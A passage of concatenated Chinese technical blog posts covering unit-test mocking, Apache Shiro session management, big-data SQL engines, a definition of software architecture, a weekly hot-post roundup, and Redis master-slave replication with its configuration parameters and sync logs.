            //这是Mock的Http请求
            var result = "SUCCESS";
            return result;
        }

        public string Get(string url)
        {
            //这是Mock的Http请求
            var result = "0.01";
            return result;
        }

   }
     如上，我们的AccountService的业务逻辑依赖于外部对象Http请求的返回值在真实的业务中我们给AccountService注入真实的HttpHelper类，而在单元测试中我们注入自己Mock的HttpHelper，我们可以根据不同的用例来模拟不同的Http请求的返回值来测试我们的AccountService的业务逻辑。
注意:记住，我们要测试的是AccountService的业务逻辑:根据不同http的请求(或传入不同的参数)而返回不同的结果，一定要弄明白自己要测的是什么！而无关的外部对象内的逻辑我们并不关心，我们只需要让它给我们返回我们想要的值，来验证我们的业务逻辑即可
    关于Mock对象一般会使用Mock框架，关于Mock框架的使用，我们将在下一篇文章中介绍。.net 平台常用的Mock框架有Moq,PhinoMocks,FakeItEasy等。
3.4 单元测试之代码覆盖率
​ 在做单元测试时，代码覆盖率常常被拿来作为衡量测试好坏的指标，甚至，用代码覆盖率来考核测试任务完成情况，比如，代码覆盖率必须达到80％或90％。于是乎，测试人员费尽心思设计案例覆盖代码。因此我认为用代码覆盖率来衡量是不合适的，我们最根本的目的是为了提高我们回归测试的效率，项目的质量不是吗?
结束语
    本篇文章主要介绍了单元测试的WWH，分享了我们为什么要做单元测试并简单介绍了单元测试的概念以及如何去做单元测试。当然，千万不要天真的以为看了本篇文章就能做好单元测试，如果你的组织开始推进了单元测试，那么在推进的过程中相信仍然会遇到许多问题(就像我们遇到的，依赖外部对象问题，静态方法如何mock......)。如何更好的去做单元测试任重而道远。下一篇文章将针对我们具体实施推进单元测试中遇到的一些问题，来讨论如何更好的做单元测试。如:如何破除依赖，如何编写可靠可维护的测试，以及如何面向测试进行程序的设计等。
​ 未完待续，敬请关注......
参考
《单元测试的艺术》
我们做单元测试的经历

********************************************************************************************************************************************************************************************************
shiro源码篇 - shiro的session管理，你值得拥有
前言
　　开心一刻
　　　　开学了，表弟和同学因为打架，老师让他回去叫家长。表弟硬气的说：不用，我打得过他。老师板着脸对他说：和你打架的那位同学已经回去叫家长了。表弟犹豫了一会依然硬气的说：可以，两个我也打得过。老师：......
 
　　路漫漫其修远兮，吾将上下而求索！
　　github：https://github.com/youzhibing
　　码云(gitee)：https://gitee.com/youzhibing
前情回顾
　　大家还记得上篇博文讲了什么吗，我们来一起简单回顾下：
　　　　HttpServletRequestWrapper是HttpServletRequest的装饰类，我们通过继承HttpServletRequestWrapper来实现我们自定义的HttpServletRequest：CustomizeSessionHttpServletRequest，重写CustomizeSessionHttpServletRequest的getSession，将其指向我们自定义的session。然后通过Filter将CustomizeSessionHttpServletRequest添加到Filter chain中，使得到达Servlet的ServletRequest是我们的CustomizeSessionHttpServletRequest。
　　今天不讲session共享，我们先来看看shiro的session管理
SecurityManager
　　SecurityManager，安全管理器；即所有与安全相关的操作都会与SecurityManager交互；它管理着所有Subject，所有Subject都绑定到SecurityManager，与Subject的所有交互都会委托给SecurityManager；SecurityManager是shiro的核心，它负责与shiro的其他组件进行交互，类似SpringMVC中的DispatcherServlet或Struts2中的FilterDispatcher。
　　我们在使用shiro的时候，首先都会先初始化SecurityManager，然后往SecurityManager中注入shiro的其他组件，像sessionManager、realm等。我们的spring-boot-shiro中初始化的是DefaultWebSecurityManager，如下


@Bean
public SecurityManager securityManager(AuthorizingRealm myShiroRealm, CacheManager shiroRedisCacheManager) {
    DefaultWebSecurityManager securityManager = new DefaultWebSecurityManager();
    securityManager.setCacheManager(shiroRedisCacheManager);
    securityManager.setRememberMeManager(cookieRememberMeManager());
    securityManager.setRealm(myShiroRealm);
    return securityManager;
}

View Code
　　SecurityManager类图
　　　　结构如下，认真看看，注意看下属性

　　　　顶层组件SecurityManager直接继承了SessionManager且提供了SessionsSecurityManager实现，SessionsSecurityManager直接把会话管理委托给相应的SessionManager；SecurityManager的默认实现：DefaultSecurityManager及DefaultWebSecurityManager都继承了SessionsSecurityManager，也就是说：默认情况下，session的管理由DefaultSecurityManager或DefaultWebSecurityManager中的SessionManager来负责。
　　　　DefaultSecurityManager
　　　　　　默认安全管理器，用于我们的javaSE安全管理，一般而言用到的少，但我们需要记住，万一哪次有这个需求呢。
　　　　　　我们来看下他的构造方法

　　　　　　默认的sessionManager是DefaultSessionManager，DefaultSessionManager具体详情请看下文。
　　　　DefaultWebSecurityManager
　　　　　　默认web安全管理器，用于我们的web安全管理；一般而言，我们的应用中初始化此安全管理器。
　　　　　　我们来看看其构造方法



public DefaultWebSecurityManager() {
    super();                                                    // 会调用SessionsSecurityManager的构造方法，实例化DefaultSessionManager
    ((DefaultSubjectDAO) this.subjectDAO).setSessionStorageEvaluator(new DefaultWebSessionStorageEvaluator());
    this.sessionMode = HTTP_SESSION_MODE;
    setSubjectFactory(new DefaultWebSubjectFactory());
    setRememberMeManager(new CookieRememberMeManager());
    setSessionManager(new ServletContainerSessionManager());    // 设置sessionManager，替换掉上面的DefaultSessionManager
}

View Code
　　　　　　可以看出此时的sessionManager是ServletContainerSessionManager，ServletContainerSessionManager具体详情请看下文。
　　　　由此可知默认情况下，DefaultSecurityManager会将session管理委托给DefaultSessionManager，而DefaultWebSecurityManager则将session管理委托给ServletContainerSessionManager。
　　　　我们可以通过继承DefaultSecurityManager或DefaultWebSecurityManager来实现自定义SecurityManager，但一般而言没必要，DefaultSecurityManager和DefaultWebSecurityManager基本能满足我们的需要了，我们根据需求二选其一即可。无论DefaultSecurityManager还是DefaultWebSecurityManager，我们都可以通过setSessionManager方法来指定sessionManager，如果不指定sessionManager的话就用的SecurityManager默认的sessionManager。
SessionManager
　　shiro提供了完整的会话管理功能，不依赖底层容器，JavaSE应用和JavaEE应用都可以使用。会话管理器管理着应用中所有Subject的会话，包括会话的创建、维护、删除、失效、验证等工作。
　　SessionManager类图

　　　　　　DefaultSessionManager
　　　　　　DefaultSecurityManager默认使用的SessionManager，用于JavaSE环境的session管理。

　　　　　　通过上图可知（结合SecurityManager类图），session创建的关键入口是SessionsSecurityManager的start方法，此方法中会将session的创建任务委托给具体的SessionManager实现。
　　　　　　DefaultSessionManager继承自AbstractNativeSessionManager，没用重写start方法，所以此时AbstractNativeSessionManager的start方法会被调用，一路往下跟，最终会调用DefaultSessionManager的doCreateSession方法完成session的创建，doCreateSession方法大家可以自行去跟下，我在这总结一下：　　　　　　　
　　　　　　　　创建session，并生成sessionId，session是shiro的SimpleSession类型，sessionId采用的是随机的UUID字符串；	　　　　　　　　sessionDAO类型是MemorySessionDAO，session存放在sessionDAO的private ConcurrentMap<Serializable, Session> sessions;属性中，key是sessionId，value是session对象；	　　　　　　　　除了MemorySessionDAO，shiro还提供了EnterpriseCacheSessionDAO，具体两者有啥区别请看我的另一篇博客讲解。
	　　　　ServletContainerSessionManager
　　　　　　DefaultWebSecurityManager默认使用的SessionManager，用于Web环境，直接使用的Servlet容器的会话，具体实现我们往下看。
　　　　　　ServletContainerSessionManager实现了SessionManager，并重写了SessionManager的start方法，那么我们从ServletContainerSessionManager的start方法开始来看看session的创建过程，如下图

　　　　　　shiro有自己的HttpServletSession，HttpServletSession持有servlet的HttpSession的引用，最终对HttpServletSession的操作都会委托给HttpSession（装饰模式）。那么此时的session是标准servlet容器支持的HttpSession实例，它不与Shiro的任何与会话相关的组件（如SessionManager，SecurityManager等）交互，完全由servlet容器管理。
	　　　　DefaultWebSessionManager
　　　　　　用于Web环境，可以替换ServletContainerSessionManager，废弃了Servlet容器的会话管理；通过此可以实现我们自己的session管理；
　　　　　　从SessionManager类图可知，DefaultWebSessionManager继承自DefaultSessionManager，也没有重写start方法，那么创建过程还是沿用的AbstractNativeSessionManager的start方法；如果我们没有指定自己的sessionDao，那么session还是存在MemorySessionDAO的ConcurrentMap<Serializable, Session> sessions中，具体可以看上述中的DefaultSessionManager。
　　　　　　通过DefaultWebSessionManager实现session共享，尽请期待！
总结
　　两个类图
　　　　SecurityManager和SessionManager的类图需要认真看看；
　　　　Subject的所有交互都会委托给SecurityManager；SecurityManager是shiro的核心，它负责与shiro的其他组件进行交互，类似SpringMVC中的DispatcherServlet或Struts2中的FilterDispatcher；
　　　　SecurityManager会将session管理委托给SessionManager；SessionsSecurityManager的start方法中将session的创建委托给了具体的sessionManager，是创建session的关键入口。	　　shiro的SimpleSession与HttpServletSession		　　　　HttpServletSession只是servlet容器的session的装饰，最终还是依赖servlet容器，是shiro对servlet容器的session的一种支持；		　　　　而SimpleSession是shiro完完全全的自己实现，是shiro对session的一种拓展。
参考
　　《跟我学shiro》
********************************************************************************************************************************************************************************************************
大数据不就是写SQL吗?
应届生小祖参加了个需求分析会回来后跟我说被产品怼了一句：

"不就是写SQL吗，要那么久吗"

我去，欺负我小弟，这我肯定不能忍呀，于是我写了一篇文章发在了公司的wiki


贴出来给大家看看，省略了一些敏感的内容。当然内部版言辞也会温和一点，嘻嘻

在哪里写SQL？
这个问题高级点的问法是用哪种SQL引擎？
SparkSQL、Hive、Phoenix、Drill、Impala、Presto、Druid、Kylin （这里的SQL引擎是广义的，大家不必钻牛角尖）
我用一句话概括下这几个东西，先不管你们现在看不看得懂：

Hive：把sql解析后用MapReduce跑
SparkSQL：把sql解析后用Spark跑，比hive快点
Phoenix：一个绕过了MapReduce运行在HBase上的SQL框架
Drill/Impala/Presto 交互式查询,都是类似google Dremel的东西，区别这里就不说了
Druid/Kylin olap预计算系统

这就涉及到更多的问题了，对这些组件不熟悉的同学可能调研过程就得花上一个多月。
比如需求是实时计算还是离线分析？
数据是增量数据还是静态数据？
数据量有多大？
能容忍多长的响应时间？
总之，功能、性能、稳定性、运维难度、开发难度这些都是要考虑的
对哪里的数据执行SQL？
你以为选完引擎就可以开写了？too naive！
上面提到的大部分工具都仅仅是查询引擎，存储呢？
“啥，为啥还要管存储？”
不管存储，那是要把PB级的数据存在mysql是吧...
关系型数据库像mysql这种，查询引擎和存储是紧耦合的，这其实是有助于优化性能的，你不能把它们拆分开来。
而大数据系统SQL引擎一般都是独立于数据存储系统，获得了更大的灵活性。这都是出于数据量和性能的考虑。
这涉及到的问题就更多了。先要搞清楚引擎支持对接哪些存储，怎么存查询起来方便高效。
可以对接的持久化存储我截个图，感受一下（这还只是一小部分）

用哪种语法写SQL？
你以为存储和查询搞定就可以开写了？你以为全天下的sql都是一样的？并不是！
并不是所有的引擎都支持join；
并不是所有的distinct都是精准计算的；
并不是所有的引擎都支持limit分页；
还有，如果处理复杂的场景经常会需要自定义sql方法，那如何自定义呢，写代码呀。
举几个简单而常见的栗子：
见过这样的sql吗？
select `user`["user_id"] from tbl_test ;
见过这种操作吗？
insert overwrite table tbl_test select * from tbl_test  where id>0; 
卧槽，这不会锁死吗？hive里不会，但是不建议这样做。
还能这么写
from tbl_test insert overwrite table tbl_test select *   where id>0; 
怎么用更高效的方式写SQL？
好了，全都搞定了，终于可以开始愉快地写SQL了。
写SQL的过程我用小祖刚来公司时的一句话来总结：

“卧槽，这条SQL有100多行！”

事实表，维表的数据各种join反复join，这还不算完还要再join不同时间的数据，还要$#@%^$#^...
不说了，写过的人一定知道有多恶心
（此处省略100多行字）
终于写完了，千辛万苦来到这一步，满心欢喜敲下回车...
时间过去1分钟...
10分钟...
30分钟...
1小时...
2小时...
......
别等了，这样下去是不会有结果的。
老实看日志吧，看日志也是一门很大的学问。
首先你得搞清楚这个sql是怎么运行，底层是mapReduce还是spark还是解析成了其他应用的put、get等接口;
然后得搞清楚数据是怎么走的，有没有发生数据倾斜，怎么优化。
同时你还得注意资源，cpu、内存、io等
最后
产品又来需求了，现有系统还无法实现，上面四步再折腾一遍...
推荐阅读
大数据需要学什么？
zookeeper-操作与应用场景-《每日五分钟搞定大数据》
zookeeper-架构设计与角色分工-《每日五分钟搞定大数据》
zookeeper-paxos与一致性-《每日五分钟搞定大数据》
zookeeper-zab协议-《每日五分钟搞定大数据》


********************************************************************************************************************************************************************************************************
什么是软件架构
本文探讨什么是「软件架构」，并对其下个定义！
决策or组成？
如果你去google一下「什么是软件架构」，你会看到各种各样的定义！不过大致可分为「决策」论和「组成」论！
其中一个比较著名的「决策」论的定义是Booch,Rumbaugh和Jacobson于1999年提出的：

架构就是一系列重要的决策，这些决策涉及软件系统的组织、组成系统的结构化元素及其接口的选择、元素之间协作时特定的行为、结构化元素和行为元素形成更大子系统的组合方式以及引导这一组织（也就是这些元素及其接口）、他们之间的协作以及组合（架构风格）。

而「组成」论中最受推崇的是SEI(Software Engineering Institute)的Len Bass等人提出的定义：

The software architecture of a program or computing system is the structure or structures of the system,which comprise software elements,the externally visible properties of those elements,and the relationships among them.

Fielding博士在他的博士论文《Architectural Styles and the Design of Network-based Software Architectures》中对软件架构的定义是这样的：

A software architecture is an abstraction of the run-time elements of a software system during some phase of its operation. A system may be composed of many levels of abstraction and many phases of operation, each with its own software architecture.
软件架构是软件系统在其操作的某个阶段的运行时的元素的抽象。一个系统可能由很多层抽象和很多个操作阶段组成,每个抽象和操作阶段都有自己的软件架构。

这其实也是「组成论」！不过这里说的是系统运行时的快照！
为什么会出现这样的分歧呢？我觉得主要问题在每个人对「架构」这个词的理解！
我先来问你一个问题，你觉得「架构」这个词是名词还是动词？或者说「架构」是一个过程，还是一个结果？
「架构」对应英文单词「Architecture」，在英文里Architecture是个名词，表示结构。但实际上结构只是架构的产物，如何得到这个结构呢？是通过架构师的一个个决策得到的。所以，「架构」包含了过程和结果！
如果你去搜一下「架构」这个词的解释，你就会发现，在中文里，「架构」这个词有两层含义（来自百度词典）：

一是间架结构
二是构筑，建造

那么，「架构」是决策还是组成呢？
Wiki上对Architecture给出了一个比较好的定义：

Architecture is both the process and the product of planning, designing, and constructing buildings or any other structures。

翻译过来就是：

架构是规划、设计、构建的过程及最终成果

但是我觉得这个定义还不够，还缺少了一个关键内容，就是「约束」！
下个定义
我个人对架构的理解是：架构是特定约束下决策的结果，并且这是一个循环递进的过程。

这句话包含了三个关键词：特定约束、决策、结果。这三个词都是中性词。特别是第三个词，由于决策的不同，得到的结果也就不同，可能是「成果」，也可能是「后果」！下面来一个个具体解释。

特定约束

我们都学过阅读理解，老师在教阅读理解的时候，会提到一个词，叫「语境」！比如下面这个段子！

领导：你这是什么意思？
小明：没什么意思，意思意思。
领导：你这就不够意思了。
小明：小意思，小意思。
领导：你这人真有意思。
小明：其实也没有别的意思。
领导：那我就不好意思了。
小明：是我不好意思。
提问：以上“意思”分别是什么意思？

这里的「意思」在不同的语境下有不同的含义。语境就是上下文，也就是我们软件行业常说的Context！Context不同，得到的结果也就不同！
其实任何行为、言语、结论都有一个Context为前提！只是在不同的情况下我们对这个Context的叫法不同！比如：

直角三角形的两直角的平方等于斜边的平方

这句话在欧几里得几何这个Context下是成立的！但是在非欧几何这个Context下就是不成立的！在数学里，这个Context可以称为是「限定条件」！
同样的牛顿力学定律，在普通场景下是成立的！但是在量子力学下是不成立的！在物理里，这个Context可以称为「环境」！
在架构里也一样，淘宝的架构可能在其它情况下并不适用，因为Context不同！这里的Context就称为「约束」！
而且这个「约束」必须是「特定约束」，不能是「泛约束」！比如说，「我要造个房子」，这个约束就是个「泛约束」！是没办法执行的！（下节通过例子来详细说明）

决策

决策是一个过程！实际上就是选择！选择技术、结构、通信方式等内容，去符合「特定约束」！
在决策时，实际上无形中又加入了一个约束：人的约束！做决策的人的认知又约束了决策本身！比如某个架构师只知道分层架构，那么他无论在哪种Context下都只有分层架构这一个选择！

结果

是决策的最终产物：可能是运行良好、满足需求的系统。也可能是一堆文档。或者是满嘴的跑火车！
如果这个结果是五视图、组件、接口、子系统、及其之间的关系，那么这个架构就是软件架构！
如果这个结果是建筑图纸、钢筋水泥、高楼大厦，那么这个架构就是建筑架构！
如果这个结果是事业成功、家庭美满，那么这个架构就是人生架构，也叫人生规划！
举个例子
以上面「我要造个房子」为例，来详细解释「架构是特定约束下决策的结果」！
上面已经说了「我要造个房子」是个泛约束，是无法满足的！因为它有很多可能性选择，且很多选择是互斥的！例如：

房子造在哪里？城市、乡村、山顶、海边、南北极......
要造成什么样子？大平层、楼房、草房、城堡......
要使用什么材料？水泥、玻璃、木头、竹子......
......

这里实际就是需求收集阶段，需要和客户沟通，挖出具体的客户需求！
假设客户最终决定：想在海边建个房子，适合两个人住，每半年过来度假一周左右，希望能方便的看到海、还有日出，预计支出不超过XX元！这就是功能性需求！
通过上面的功能性需求，你需要挖出非功能性需求：

海边风大、潮湿。如何防风？防潮？
海潮声音大，是否需要做好隔音？避免影响睡眠？
希望能看到海和日出，使用玻璃是否合适？需要什么样的玻璃？
价格是否超出预算？
.....

完善的需求（功能性、非功能性），实际就是架构的「特定约束」！而对上面这些问题的选择，就是「决策」！

为了防风，地基要打深一点；要使用防潮材料
墙壁需要加厚，使用隔音门和窗户
面朝大海的墙使用强化加厚玻璃墙
选择价格内的材料
......

这些决策确定后，需要告诉工人如何建造！需要相关的设计图，对不同的人需要不同的图！比如，对建造工人就是整体结构说明图，水电工就是水电线路图！这些图纸就是你决策的部分结果。
整个过程是个循环递进的过程！比如：你为了解决客户方便看海的问题，先选择了开一个较大的窗户的方案！但是客户觉得不够大！你决定直接把整面墙都使用玻璃来建造，客户很满意，但是承重、防风等问题如何解决？你最终决定通过使用强化的加厚玻璃来解决这个问题！
最终交付给客户的房子才是你架构的最终成果！
免责申明：我不懂造房子，以上言论都是胡诌的，你理解意思就行了！
纵向深入
最近订阅了李运华的《从0开始学架构》，他对架构的理解是：软件架构指软件系统的顶层结构！我觉得这个定义太过宽泛了，且只是定义了「结构」而没有说明「过程」！不过，这间接说明了架构和设计的关系！架构是顶层设计！
从操作层面做决策：用户从哪里进入、页面应该跳转到哪里、应该输入哪些信息.....这就是流程设计！
从代码层面决策，代码该怎么写：模块如何组织、包如何组织、类如何组织、方法如何组织......这就是代码设计！
从系统整体层面决策：子系统如何组织、组件如何组织、接口如何设计......这就是架构设计！
横向扩展
好像架构思维是个比较通用的思维方式！读书，演讲，写作.....都是这样！
读书，你需要先了解这本书是讲关于什么的？计算机、哲学、心理学.....以及具体是讲的哪个方面？这是约束！然后你需要问自己，自己是否需要了解这些内容？是否需要读这本书？这就是决策！如果需要读，那么再进一步，这本书的整体结构是什么样子的？我该怎么读？这个章节是讲什么的？我是否需要读？我是否同意作者的结论？如果同意，我为什么同意？如果不同意，我为什么不同意？我有什么自己的观点？最终的成果就是我对这本书的个人理解！
演讲，你需要先了解你是对谁进行演讲的？要讲什么？听众的水平如何？听众的水平以及演讲的内容就是你演讲的约束！然后你需要考虑如何进行演讲？演讲的整体结构该怎么组织？该用什么样的语言？是否该讲个笑话？各个小节里的内功如何组织？这里是否需要设置问题？这里是否可能会有人提出问题？会提出什么样的问题？我该如何回答？这些是决策！最终，做出来的演讲，就是我这次演讲的成果！
写作和演讲比较类似，少了一些互动。就不再赘述了！
做个小结
本文梳理了我对架构的理解：架构是特定约束下决策的结果，并且这是一个循环递进的过程。并通过例子来解释我为什么这么理解！
参考资料

《IBM架构思维介绍》
《恰如其分的软件架构》
《Java应用架构设计》
《软件架构设计》
《程序员必读之软件架构》
维基百科
百度词典


********************************************************************************************************************************************************************************************************
上周热点回顾（10.1-10.7）
热点随笔：
· .NET 开源项目 Polly 介绍（Liam Wang）· .Net Core中的Api版本控制（LamondLu）· TCP协议学习总结（上）（wc的一些事一些情）· Jenkins pipeline 并行执行任务流（sparkdev）· 一文搞懂：词法作用域、动态作用域、回调函数、闭包（骏马金龙）· 为什么程序员需要知道互联网行业发展史（kid551）· 用CSS实现一个抽奖转盘（wenr）· 大数据不就是写sql吗?（大叔据）· .NET微服务调查结果（张善友）· 工作五年总结——以及两年前曾提出问题的回答（受戒人）· 我是如何学习数据结构与算法的？（帅地）· 在国企的日子(序言)（心灵之火）
热点新闻：
· 腾讯员工离职忠告：离开大公司 我才知道世界有多坏· 可怕！29岁小伙心脏血管犹如豆腐渣！只因这个习惯· 彭博社曝光的“间谍芯片” 我在淘宝1块钱就能买一个· 这15张图能教给你的东西，比读完100本书还多· 一天内让两位名人去世，这种病是“癌症之王”· 怎样的物理学天才 让诺贝尔奖破例为他改了颁奖地点· 杭州，AI时代的第一个城市“牺牲品”· 贾跃亭提起仲裁欲踢恒大出局 花光8亿美元再要7个亿· 微软开源基于模型的机器学习框架Infer.NET· 陈列平与诺奖失之交臂，但他的贡献远比诺奖重要· 马云放弃在阿里巴巴主要法律实体的所有权· 今天所有美国手机都收到总统警报，到底是咋回事？
********************************************************************************************************************************************************************************************************
Redis-复制
复制
A few things to understand ASAP about Redis replication.

1) Redis replication is asynchronous, but you can configure a master to
   stop accepting writes if it appears to be not connected with at least
   a given number of slaves.
2) Redis slaves are able to perform a partial resynchronization with the
   master if the replication link is lost for a relatively small amount of
   time. You may want to configure the replication backlog size (see the next
   sections of this file) with a sensible value depending on your needs.
3) Replication is automatic and does not need user intervention. After a
   network partition slaves automatically try to reconnect to masters
   and resynchronize with them.

 
复制的实现
1. 设置主节点的地址和端口
简而言之，是执行SLAVEOF命令，该命令是个异步命令，在设置完masterhost和masterport属性之后，从节点将向发送SLAVEOF的客户端返回OK。表示复制指令已经被接受，而实际的复制工作将在OK返回之后才真正开始执行。
 
2. 创建套接字连接。
在执行完SLAVEOF命令后，从节点根据命令所设置的IP和端口，创建连向主节点的套接字连接。如果创建成功，则从节点将为这个套接字关联一个专门用于处理复制工作的文件事件处理器，这个处理器将负责执行后续的复制工作，比如接受RDB文件，以及接受主节点传播来的写命令等。
 
3. 发送PING命令。
从节点成为主节点的客户端之后，首先会向主节点发送一个PING命令，其作用如下：
1. 检查套接字的读写状态是否正常。
2. 检查主节点是否能正常处理命令请求。
如果从节点读取到“PONG”的回复，则表示主从节点之间的网路连接状态正常，并且主节点可以正常处理从节点发送的命令请求。
 
4. 身份验证
从节点在收到主节点返回的“PONG”回复之后，接下来会做的就是身份验证。如果从节点设置了masterauth选项，则进行身份验证。反之则不进行。
在需要进行身份验证的情况下，从节点将向主节点发送一条AUTH命令，命令的参数即可从节点masterauth选项的值。
 
5. 发送端口信息。
在身份验证之后，从节点将执行REPLCONF listening-port  <port-number>，向主节点发送从节点的监听端口号。
主节点会将其记录在对应的客户端状态的slave_listening_port属性中，这点可通过info Replication查看。

127.0.0.1:6379> info Replication
# Replication
role:master
connected_slaves:1
slave0:ip=127.0.0.1,port=6380,state=online,offset=3696,lag=0

 
6. 同步。
从节点向主节点发送PSYNC命令，执行同步操作，并将自己的数据库更新至主节点数据库当前所处的状态。
 
7. 命令传播
当完成了同步之后，主从节点就会进入命令传播阶段。这时主节点只要一直将自己执行的写命令发送到从节点，而从节点只要一直接收并执行主节点发来的写命令，就可以保证主从节点保持一致了。
 
8. 心跳检测
在命令传播阶段，从节点默认会以每秒一次的频率，向主节点发送命令。
REPLCONF ACK <replication_offset>
其中，replication_offset是从节点当前的复制偏移量。
发送REPLCONF ACK主从节点有三个作用：
1> 检测主从节点的网络连接状态。
2> 辅助实现min-slave选项。
3> 检查是否存在命令丢失。
REPLCONF ACK命令和复制积压缓冲区是Redis 2.8版本新增的，在此之前，即使命令在传播过程中丢失，主从节点都不会注意到。
 
复制的相关参数

slaveof <masterip> <masterport>
masterauth <master-password>

slave-serve-stale-data yes

slave-read-only yes

repl-diskless-sync no

repl-diskless-sync-delay 5

repl-ping-slave-period 10

repl-timeout 60

repl-disable-tcp-nodelay no

repl-backlog-size 1mb

repl-backlog-ttl 3600

slave-priority 100

min-slaves-to-write 3
min-slaves-max-lag 10

slave-announce-ip 5.5.5.5
slave-announce-port 1234

其中，
slaveof <masterip> <masterport>：开启复制，只需这条命令即可。
masterauth <master-password>：如果master中通过requirepass参数设置了密码，则slave中需设置该参数。
slave-serve-stale-data：当主从连接中断，或主从复制建立期间，是否允许slave对外提供服务。默认为yes，即允许对外提供服务，但有可能会读到脏的数据。
slave-read-only：将slave设置为只读模式。需要注意的是，只读模式针对的只是客户端的写操作，对于管理命令无效。
repl-diskless-sync，repl-diskless-sync-delay：是否使用无盘复制。为了降低主节点磁盘开销，Redis支持无盘复制，生成的RDB文件不保存到磁盘而是直接通过网络发送给从节点。无盘复制适用于主节点所在机器磁盘性能较差但网络宽带较充裕的场景。需要注意的是，无盘复制目前依然处于实验阶段。
repl-ping-slave-period：master每隔一段固定的时间向SLAVE发送一个PING命令。
repl-timeout：复制超时时间。

# The following option sets the replication timeout for:
#
# 1) Bulk transfer I/O during SYNC, from the point of view of slave.
# 2) Master timeout from the point of view of slaves (data, pings).
# 3) Slave timeout from the point of view of masters (REPLCONF ACK pings).
#
# It is important to make sure that this value is greater than the value
# specified for repl-ping-slave-period otherwise a timeout will be detected
# every time there is low traffic between the master and the slave.

 
repl-disable-tcp-nodelay：设置为yes，主节点会等待一段时间才发送TCP数据包，具体等待时间取决于Linux内核，一般是40毫秒。适用于主从网络环境复杂或带宽紧张的场景。默认为no。
 
repl-backlog-size：复制积压缓冲区，复制积压缓冲区是保存在主节点上的一个固定长度的队列。用于从Redis 2.8开始引入的部分复制。

# Set the replication backlog size. The backlog is a buffer that accumulates
# slave data when slaves are disconnected for some time, so that when a slave
# wants to reconnect again, often a full resync is not needed, but a partial
# resync is enough, just passing the portion of data the slave missed while
# disconnected.
#
# The bigger the replication backlog, the longer the time the slave can be
# disconnected and later be able to perform a partial resynchronization.
#
# The backlog is only allocated once there is at least a slave connected.

只有slave连接上来，才会开辟backlog。
 
repl-backlog-ttl：如果master上的slave全都断开了，且在指定的时间内没有连接上，则backlog会被master清除掉。repl-backlog-ttl即用来设置该时长，默认为3600s，如果设置为0，则永不清除。
 
slave-priority：设置slave的优先级，用于Redis Sentinel主从切换时使用，值越小，则提升为主的优先级越高。需要注意的是，如果设置为0，则代表该slave不参加选主。
 
slave-announce-ip，slave-announce-port ：常用于端口转发或NAT场景下，对Master暴露真实IP和端口信息。
 
同步的过程
1. 从节点向主节点发送PSYNC命令。
2. 收到PSYNC命令的主节点执行BGSAVE命令，在后台生成一个RDB文件，并使用一个缓冲区记录从现在开始执行的所有写命令。
3. 当主节点的BGSAVE命令执行完毕时，主节点会将BGSAVE命令生成的RDB文件发送给从节点，从节点接受并载入这个RDB文件，将自己的数据库状态更新至主节点执行BGSAVE命令时的数据库状态。
4. 主节点将记录在缓冲区里面的所有写命令发送给从节点，从节点执行这些写命令，将自己的数据库状态更新至主节点数据库当前所处的状态。
 
需要注意的是，在步骤2中提到的缓冲区，其实是有大小限制的，其由client-output-buffer-limit slave 256mb 64mb 60决定，该参数的语法及解释如下：

# client-output-buffer-limit <class> <hard limit> <soft limit> <soft seconds>
#
# A client is immediately disconnected once the hard limit is reached, or if
# the soft limit is reached and remains reached for the specified number of
# seconds (continuously).

意思是如果该缓冲区的大小超过256M，或该缓冲区的大小超过64M，且持续了60s，主节点会马上断开从节点的连接。断开连接后，在60s之后（repl-timeout），从节点发现没有从主节点中获得数据，会重新启动复制。
 
在Redis 2.8之前，如果因网络原因，主从节点复制中断，当再次建立连接时，还是会执行SYNC命令进行全量复制。效率较为低下。从Redis 2.8开始，引入了PSYNC命令代替SYNC命令来执行复制时的同步操作。
PSYNC命令具有全量同步（full resynchronization）和增量同步（partial resynchronization）。
全量同步的日志：
master：

19544:M 05 Oct 20:44:04.713 * Slave 127.0.0.1:6380 asks for synchronization
19544:M 05 Oct 20:44:04.713 * Partial resynchronization not accepted: Replication ID mismatch (Slave asked for 'dc419fe03ddc9ba30cf2a2cf1894872513f1ef96', my 
replication IDs are 'f8a035fdbb7cfe435652b3445c2141f98a65e437' and '0000000000000000000000000000000000000000')19544:M 05 Oct 20:44:04.713 * Starting BGSAVE for SYNC with target: disk
19544:M 05 Oct 20:44:04.713 * Background saving started by pid 20585
20585:C 05 Oct 20:44:04.723 * DB saved on disk
20585:C 05 Oct 20:44:04.723 * RDB: 0 MB of memory used by copy-on-write
19544:M 05 Oct 20:44:04.813 * Background saving terminated with success
19544:M 05 Oct 20:44:04.814 * Synchronization with slave 127.0.0.1:6380 succeeded

slave：

19746:S 05 Oct 20:44:04.288 * Before turning into a slave, using my master parameters to synthesize a cached master: I may be able to synchronize with the new
 master with just a partial transfer.19746:S 05 Oct 20:44:04.288 * SLAVE OF 127.0.0.1:6379 enabled (user request from 'id=3 addr=127.0.0.1:37128 fd=8 name= age=929 idle=0 flags=N db=0 sub=0 psub=
0 multi=-1 qbuf=0 qbuf-free=32768 obl=0 oll=0 omem=0 events=r cmd=slaveof')19746:S 05 Oct 20:44:04.712 * Connecting to MASTER 127.0.0.1:6379
19746:S 05 Oct 20:44:04.712 * MASTER <-> SLAVE sync started
19746:S 05 Oct 20:44:04.712 * Non blocking connect for SYNC fired the event.
19746:S 05 Oct 20:44:04.713 * Master replied to PING, replication can continue...
19746:S 05 Oct 20:44:04.713 * Trying a partial resynchronization (request dc419fe03ddc9ba30cf2a2cf1894872513f1ef96:1191).
19746:S 05 Oct 20:44:04.713 * Full resync from master: f8a035fdbb7cfe435652b3445c2141f98a65e437:1190
19746:S 05 Oct 20:44:04.713 * Discarding previously cached master state.
19746:S 05 Oct 20:44:04.814 * MASTER <-> SLAVE sync: receiving 224566 bytes from master
19746:S 05 Oct 20:44:04.814 * MASTER <-> SLAVE sync: Flushing old data
19746:S 05 Oct 20:44:04.815 * MASTER <-> SLAVE sync: Loading DB in memory
19746:S 05 Oct 20:44:04.817 * MASTER <-> SLAVE sync: Finished with success

 
增量同步的日志：
master：

19544:M 05 Oct 20:42:06.423 # Connection with slave 127.0.0.1:6380 lost.
19544:M 05 Oct 20:42:06.753 * Slave 127.0.0.1:6380 asks for synchronization
19544:M 05 Oct 20:42:06.753 * Partial resynchronization request from 127.0.0.1:6380 accepted. Sending 0 bytes of backlog starting from offset 1037.

slave：

19746:S 05 Oct 20:42:06.423 # Connection with master lost.
19746:S 05 Oct 20:42:06.423 * Caching the disconnected master state.
